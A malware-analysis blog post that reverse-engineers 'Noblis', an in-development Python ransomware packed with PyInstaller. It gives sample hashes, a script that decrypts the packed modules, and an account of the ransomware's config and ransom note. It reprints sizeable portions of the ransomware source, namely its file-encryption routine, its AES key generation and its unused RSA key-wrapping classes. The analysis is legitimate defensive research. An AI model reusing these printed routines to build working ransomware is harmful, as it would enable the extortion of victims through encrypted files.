---
title: "Analysis of Noblis In-dev Ransomware"
date: 2017-12-13T22:20:00+05:30
slug: "analysis-of-noblis-in-dev-ransomware"
draft: false
tags:
  - "Noblis Ransomware"
  - "PyInstaller"
  - "python"
  - "Ransomware"
cover:
  image: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgb-XBfurdsdPLKRO8JvWXNKxMuYE8bfGcJvYFvRqaZLQQcaO0i1ekDeAXzUte6vtu_Nry0Seeoczize_nNoppZ69Ms3g6-KL58fCHzrbb0fAI8_VP8bhB0n_lqmb_w-NjYXNfeLS2H1guz/s1600/encryptd_files.PNG"
  alt: "Analysis of Noblis In-dev Ransomware"
  relative: false
canonicalURL: "https://sdkhere.blogspot.com/2017/12/analysis-of-noblis-in-dev-ransomware.html"
ShowToc: true
TocOpen: false
---

Noblis is in-development ransomware which is built in Python and packed by PyInstaller.  
You can refer to my [previous blog](http://www.sdkhere.com/2017/07/reversing-of-python-built-exe.html) to learn how to identify and reverse Python-built executables.  
  
We have the following sample:  
Hash : 3BEEE8D7F55CD8298FCB009AA6EF6AAE [[App.Any](https://app.any.run/tasks/c8cbcab0-48be-470e-88f4-24617d85a292)]  
  
The sample is UPX packed; after unpacking we get the following sample.  
Hash : A886E7FAB4A2F1B1B048C217B4969762  
  
The binary has many Python reference strings and a zlib archive appended to it as an overlay.  
You can use the [PyExtractor](https://sourceforge.net/projects/pyinstallerextractor/files/) tool to extract the Python code from the binary.  
  
After extraction we get AES-encrypted Python modules.  
The AES key is present in the file pyimod00\_crypto\_key, which is "9876501234DAVIDM", and you can use the below script to extract those modules.  
  

```
from Crypto.Cipher import AES
import zlib
import sys

CRYPT_BLOCK_SIZE = 16

# key obtained from pyimod00_crypto_key
key = '9876501234DAVIDM'

inf = open(sys.argv[1], 'rb') # encrypted file input
outf = open(sys.argv[1]+'.pyc', 'wb') # output file 

# Initialization vector
iv = inf.read(CRYPT_BLOCK_SIZE)

cipher = AES.new(key, AES.MODE_CFB, iv)

# Decrypt and decompress
plaintext = zlib.decompress(cipher.decrypt(inf.read()))

# Write pyc header
outf.write('\x03\xf3\x0d\x0a\0\0\0\0')

# Write decrypted data
outf.write(plaintext)

inf.close()
outf.close()
```

  
Let's move towards the ransomware.  
On execution of the ransomware, it creates a mutex named "mutex\_rr\_windows". If the mutex is already created, it will open only the GUI panel; otherwise it runs the crypter.  
The main wrapper of this ransomware is below.  
  

```
  def __init__(self):
    '''
    @summary: Constructor
    '''
    self.__config = self.__load_config()
    self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "encrypted_files.txt")

    # Init Crypt Lib
    self.Crypt = Crypt.SymmetricCrypto()

    # FIRST RUN
    # Encrypt!
    if not os.path.isfile(self.encrypted_file_list):
      self.Crypt.init_keys()
      file_list = self.find_files()
      # Start encryption
      self.encrypt_files(file_list)
      # If no files were encrypted. do nothing 
      if not os.path.isfile(self.encrypted_file_list):
          return
      # Present GUI
      self.start_gui()
    # ALREADY ENCRYPTED
    # Present menu
    elif os.path.isfile(self.encrypted_file_list):
      self.start_gui()
```

  
It checks for a file encrypted\_files.txt in %APPDATA%; if it is not there, it will proceed with the encryption.  
It initializes the encryption key, finds the specified files for encryption, encrypts them, makes an entry for each encrypted file in encrypted\_files.txt, and displays a GUI form.  
  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgb-XBfurdsdPLKRO8JvWXNKxMuYE8bfGcJvYFvRqaZLQQcaO0i1ekDeAXzUte6vtu_Nry0Seeoczize_nNoppZ69Ms3g6-KL58fCHzrbb0fAI8_VP8bhB0n_lqmb_w-NjYXNfeLS2H1guz/s640/encryptd_files.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgb-XBfurdsdPLKRO8JvWXNKxMuYE8bfGcJvYFvRqaZLQQcaO0i1ekDeAXzUte6vtu_Nry0Seeoczize_nNoppZ69Ms3g6-KL58fCHzrbb0fAI8_VP8bhB0n_lqmb_w-NjYXNfeLS2H1guz/s1600/encryptd_files.PNG)  
  
The ransomware has an independent configuration file (runtime.cfg) which is loaded at runtime.  
The configuration file has the encrypted file extension, ransom note, file types to be encrypted, BTC amount, wallet address, etc.  
  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHPOjJPtPcMLG1eHMWhqUiWqsGbFc0gbgp7mvF8SOAKGPY_DmUkO4Ae3gioaAb4QzV_PNvWd8wnUCEhLEpkGrbptnFc8AUOttoxIlbHmKrLZjXlnq6SDmVyozlS0wv-wh6-StAtwzOy0vP/s640/configfile.JPG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHPOjJPtPcMLG1eHMWhqUiWqsGbFc0gbgp7mvF8SOAKGPY_DmUkO4Ae3gioaAb4QzV_PNvWd8wnUCEhLEpkGrbptnFc8AUOttoxIlbHmKrLZjXlnq6SDmVyozlS0wv-wh6-StAtwzOy0vP/s1600/configfile.JPG)  
  
Here, the wallet address is invalid; that's why we are calling it in-development ransomware.  
The ransom note is in Spanish and it points to a handle @4v4t4r.  
  
Let's have a look at encryption process.  
  

```
    def init_keys(self, key=None):
        """
        @summary: initialise the symmetric keys. Uses the provided key, or creates one
        @param key: If None provided, a new key is generated, otherwise the provided key is used
        """
        if not key:
            self.load_symmetric_key()
        else:
            self.key = key

    def load_symmetric_key(self):
        if os.path.isfile('key.txt'):
            fh = open('key.txt', 'r')
            self.key = fh.read()
            fh.close()
        else:
            self.key = self.generate_key()

    def generate_key(self):
        key = ('').join((random.choice('0123456789ABCDEF') for i in range(32)))
        fh = open('key.txt', 'w')
        fh.write(key)
        fh.close()
        return key
  
    def encrypt_file(self, file, extension):
        """
        @summary: Encrypts the target file
        @param file: Absolute path to the file to encrypt
        @param extension: The extension to add to the encrypted file
        """
        file_details = self.process_file(file, 'encrypt', extension)
        if file_details['error']:
            return False
        try:
            fh_read = open(file_details['full_path'], 'rb')
            fh_write = open(file_details['locked_path'], 'wb')
        except IOError:
            return False

        while True:
            block = fh_read.read(self.BLOCK_SIZE_BYTES)
            if not block:
                break
            to_encrypt = self.pad(block)
            iv = Random.new().read(AES.block_size)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            try:
                ciphertext = iv + cipher.encrypt(to_encrypt)
            except MemoryError:
                return False

            fh_write.write(ciphertext)

        fh_write.close()
        fh_read.close()
        file_details['state'] = 'encrypted'
        return file_details['locked_path']
```

  
If key.txt is not present in the current directory, it will generate an AES key of size 32 bytes and store it in key.txt. At the time of encryption, it generates an Initialization Vector (IV) and encrypts the files (having extensions specified in the configuration file) with AES-256.  
The first 16 bytes of every encrypted file is the IV, and the rest is encrypted with this IV and the key stored in key.txt.  
  
After encryption of every file, it will start a GUI panel shown below.  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5QH7KwQzaollnLlR3-d4e9yMN6S6w4lcLgbjdMGmHQfr4G9HjByMx-5K52AbXKaCmwr3NjOoAaAOKVf3l4Rcf7XTuzbmBhMDUztGfLilgHqBMhHaJhPLvKktDBITuakvK4mZxWNTl2U1R/s640/showdialog.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5QH7KwQzaollnLlR3-d4e9yMN6S6w4lcLgbjdMGmHQfr4G9HjByMx-5K52AbXKaCmwr3NjOoAaAOKVf3l4Rcf7XTuzbmBhMDUztGfLilgHqBMhHaJhPLvKktDBITuakvK4mZxWNTl2U1R/s1600/showdialog.PNG)  
  
Decryption tool -  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1ganVFsbj4ZTOd-C_W4GMjrHgL8j3wmhKydGT2tnJYD5SQmeO7KVVhZ1cxVSS7E2xuK8zTQuZYT8gqtjrVykeZrF26ivB5Z1e4x7I45GaO89SiR0wo-vDebhR9IwoQWS_YsdTGj39SfR_/s400/decryption_.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1ganVFsbj4ZTOd-C_W4GMjrHgL8j3wmhKydGT2tnJYD5SQmeO7KVVhZ1cxVSS7E2xuK8zTQuZYT8gqtjrVykeZrF26ivB5Z1e4x7I45GaO89SiR0wo-vDebhR9IwoQWS_YsdTGj39SfR_/s1600/decryption_.PNG)  
  
The ransomware has the code for RSA encryption but it is not used here; maybe it will come with RSA encryption in the next version.  
  
  

```
class GenerateKeys:

    def __init__(self):
        self.local_public_key = ''
        self.local_private_key = ''
        self.key_length = 2048
        rsa_handle = RSA.generate(self.key_length)
        self.local_private_key = rsa_handle.exportKey('PEM')
        self.local_public_key = rsa_handle.publickey()
        self.local_public_key = self.local_public_key.exportKey('PEM')

class EncryptKey:

    def __init__(self, recipient_public_key, sym_key):
        self.recipient_public_key = recipient_public_key
        self.key_to_encrypt = str(sym_key)
        self.encrypted_key = self.encrypt_key()

    def encrypt_key(self):
        rsa_handle = RSA.importKey(self.recipient_public_key)
        key = rsa_handle.encrypt(self.key_to_encrypt, 1)
        return key

class DecryptKey:

    def __init__(self, private_key, sym_key, phrase):
        self.private_key = private_key
        self.key_to_decrypt = sym_key
        self.phrase = phrase
        self.decrypted_key = self.decrypt_key()

    def decrypt_key(self):
        rsa_handle = RSA.importKey(self.private_key, self.phrase)
        key = rsa_handle.decrypt(self.key_to_decrypt)
        return key
```
